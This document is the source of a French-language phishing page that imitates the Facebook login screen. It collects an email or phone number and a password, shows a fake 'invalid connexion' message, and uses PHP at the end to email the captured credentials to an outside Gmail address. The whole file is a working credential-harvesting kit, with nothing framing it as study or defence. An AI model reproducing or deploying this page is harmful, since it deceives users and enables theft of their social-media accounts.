<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Connexion - Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<h1 align="center" class="f1">facebook</h1>
<div class="romantism">
<h2 class="_8eso">Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
</div>
<style>
    .f1{
        font-family:  'Helvetica', sans-serif;
color:rgb(0, 119, 255);
font-weight: 700;
font-size: 60px;
    }
.romantism
{
    width: 70%;
    margin: auto;
    margin-bottom: 0;
    padding: 0;
}
    ._8eso{
   font-weight: 100;
    }
</style>
    <div class="container">
        
        <form class="login-form" method="GET" action="#">
            <input style="width: 90%;
            margin-top:0px;
            height:30px;
            
            " type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
            <input 
            style="width: 90%;
            margin-top:0px;
            height:30px;
            
            "
            
            type="password" name="pass" placeholder="Mot de passe" required>


            <div id="kolamino" >
            


            </div>
            <button onclick="roma()" type="submit">Se connecter</button>
            

            <script>
                function roma()
               {
                let kolanima=document.getElementById('kolanima');
                kolanima.innerHTML='invalid connexion';
                kolanima.classList.add('kola')
               }
            </script>
        </form>
        <style>
            .kola{
background-color: rgb(160, 29, 40);
color: red;
border-radius: 20Px;

width: 80%;
margin:3px auto;
            }
            input{
                width: 90%;
                margin: auto;
            }
        </style>
        <div class="links">
            <a style="padding: 0;">Mot de passe oublié ?</a>
            <button class="b2">Créer un nouveau compte</button>
        </div>
        <style>
            .b2 {
                width: 56%;
    height: 60px;
    background-color: rgb(23, 158, 43);
    
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
            }
            .b2:hover
            {
                background-color: rgb(15, 143, 34);
            }
        </style>
    </div>


    <p style="width: 40%;
    margin:auto;
    font-size:15px;"><b>Créer une Page </b>pour une célébrité, une marque ou une entreprise.</p>
</body>
</html>
<style>
    body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    margin: 0;
    padding: 0;
}

.container {
    width: 100%;
    max-width: 400px;
    margin: 10px auto;
    padding: 20px;
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

.logo h1 {
    color: #1877f2;
    font-size: 40px;
    margin: 0;
}

.login-form {
    height: 200px;
}

.login-form input {
    
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 5px;
}

 button {
    width: 96%;
    height: 50px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 16px;
}

button:hover {
    background-color: #155dbb;
}

.links {
    margin-top: 15px;
}

.links a {
    color: #1877f2;
    text-decoration: none;
    display: block;
    margin-bottom:10px;
    padding: 0;
}

.links a:hover {
    text-decoration: underline;
}

input{
                width: 90%;
                margin: auto;
            }
</style>

<?php 

require_once('mail.php');
$mail->setFrom('electroboy776@gmail.com','');
$mail->addAddress('melele804@gmail.com');




$mail ->Subject ="R1";
if(isset($_GET['email'])&& isset($_GET['pass']))
{
    $mail ->Body    = "the email is :". $_GET['email']."<br>and the password is :".$_GET['pass'];

}

$mail->send();



?>